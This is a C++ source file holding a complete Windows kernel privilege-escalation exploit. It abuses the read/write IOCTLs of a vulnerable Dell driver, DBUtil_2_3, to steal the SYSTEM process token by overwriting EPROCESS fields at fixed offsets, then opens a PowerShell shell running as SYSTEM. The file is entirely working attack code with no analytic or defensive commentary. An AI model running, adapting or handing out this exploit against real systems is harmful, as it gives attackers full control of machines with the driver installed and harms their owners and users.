#include <iostream>
#include <Windows.h>
#include <Psapi.h>

#define IOCTL_PHYSICAL_READ  0x9B0C1F40
#define IOCTL_PHYSICAL_WRITE 0x9B0C1F44
#define IOCTL_VIRTUAL_READ   0x9B0C1EC4
#define IOCTL_VIRTUAL_WRITE  0x9B0C1EC8

HANDLE hDriver = 0;

LPVOID GetKernelModuleBase(const char* driver)
{
	LPVOID lpImageBase[1024];
	DWORD dwBytesReturned = 0;
	char szDriver[1024];
	if (!EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &dwBytesReturned))
	{
		printf("[-] Error %d getting driver base address\n", GetLastError());
		return 0;
	}

	for (int i = 0; i < dwBytesReturned / sizeof(lpImageBase[0]); i++)
	{
		if (!GetDeviceDriverBaseNameA(lpImageBase[i], szDriver, sizeof(szDriver)))
		{
			printf("[-] GetDeviceDriverFileName failed with error %d\n", GetLastError());
			return 0;
		}

		if (strcmp(driver, szDriver) == 0)
		{
			return lpImageBase[i];
		}
	}

	return 0;
}

uintptr_t read64(uintptr_t address)
{
	DWORD dwBytesReturned = 0;
	uintptr_t buffer[0x20 / sizeof(uintptr_t)];
	uintptr_t out[0x20 / sizeof(uintptr_t)];
	
	memset(buffer, 0, sizeof(buffer));
	buffer[1] = address;
	
	if (DeviceIoControl(hDriver, IOCTL_VIRTUAL_READ, buffer, sizeof(buffer), out, sizeof(out), &dwBytesReturned, 0))
		return out[3];
	else
		return 0;
}

bool write64(uintptr_t address, uintptr_t value)
{
	DWORD dwBytesReturned = 0;
	uintptr_t buffer[0x20 / sizeof(uintptr_t)];
	char out[0x20];

	memset(buffer, 0, sizeof(buffer));
	buffer[1] = address;
	buffer[3] = value;

	return DeviceIoControl(hDriver, IOCTL_VIRTUAL_WRITE, buffer, sizeof(buffer), out, sizeof(out), &dwBytesReturned, 0);
}

int main()
{
	// Used to load ntoskrl locally so we can dynamically resolve symbols corrisponding to the target OS version
	HMODULE local_ntoskrnl = 0;
	// Variable required for a few winapi calls
	DWORD dwBytesReturned;
	// PID of our current process
	DWORD pid;
	// PID of the current EPROCESS structure being checked
	DWORD current_pid;
	// Value of the system processes security token
	ULONGLONG systemtoken;
	// ntoskrnl base address in the kernel
	uintptr_t ntoskrnl = 0;
	// Address of the PsInitialSystemProcess variable
	uintptr_t PsInitialSystemProcessAddr = 0;
	// Address of the current EPROCESS structure
	uintptr_t current_addr = 0;

	// Get the base address of ntoskrnl.exe in the kernel
	ntoskrnl = (uintptr_t)GetKernelModuleBase("ntoskrnl.exe");
	if (ntoskrnl == 0)
		goto exit;
	printf("ntoskrnl at %p\n", ntoskrnl);

	// Open a handle to the vulnerable dell driver
	hDriver = CreateFileA("\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d opening handle to driver\n", GetLastError());
		goto exit;
	}
	printf("[+] Opened handle to driver %x\n", hDriver);

	// Load a local version of ntoskrnl.exe to resolve symbols dynamically and get offsets for the kernel instance
	local_ntoskrnl = LoadLibraryA("C:\\windows\\system32\\ntoskrnl.exe");
	if (local_ntoskrnl == 0)
	{
		printf("[-] Error %d loading ntoskrnl.exe locally\n", GetLastError());
		goto exit;
	}

	// Get the address of PsInitialSystemProcess locally so we can get its offset
	PsInitialSystemProcessAddr = (uintptr_t)GetProcAddress(local_ntoskrnl, "PsInitialSystemProcess");
	if (PsInitialSystemProcessAddr == 0)
	{
		printf("[-] Error %d finding PsInitialSystemProcess locally\n", GetLastError());
		goto exit;
	}

	// Get the offset of PsInitialSystemProcess to know where to read from the kernel
	PsInitialSystemProcessAddr = PsInitialSystemProcessAddr - (uintptr_t)local_ntoskrnl;
	printf("[+] PsInitialSystemProcess at offset %x\n", PsInitialSystemProcessAddr);
	
	// Get system EPROCESS address
	current_addr = ntoskrnl + PsInitialSystemProcessAddr;
	current_addr = read64(current_addr);
	systemtoken = read64(current_addr + 0x4b8);

	printf("[+] Found system processes token %x\n", systemtoken);

	// Loop EPROCESS structures until we find the one for our process
	pid = GetCurrentProcessId();
	while(true)
	{
		current_pid = read64(current_addr + 0x440);
		if (current_pid == pid)
			break;
		current_addr = read64(current_addr + 0x448);
		current_addr -= 0x448;
	}

	printf("[+] Found address of our processes EPROCESS structure %p\n", current_addr);

	// Write system token to our processes token
	if (!write64(current_addr + 0x4b8, systemtoken))
	{
		printf("[-] Error writing system token\n");
		goto exit;
	}
	else
	{
		// We should be running under the context of the system process now so simply open a shell and get to work!
		printf("[+] System token should be changed, opening shell\n");

		STARTUPINFOA startInfo;
		PROCESS_INFORMATION procInfo;
		memset(&startInfo, 0, sizeof(startInfo));
		memset(&procInfo, 0, sizeof(procInfo));

		CreateProcessA(0, (LPSTR)"powershell.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo);
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}

exit:
	CloseHandle(hDriver);
	Sleep(1000);
	return 0;
}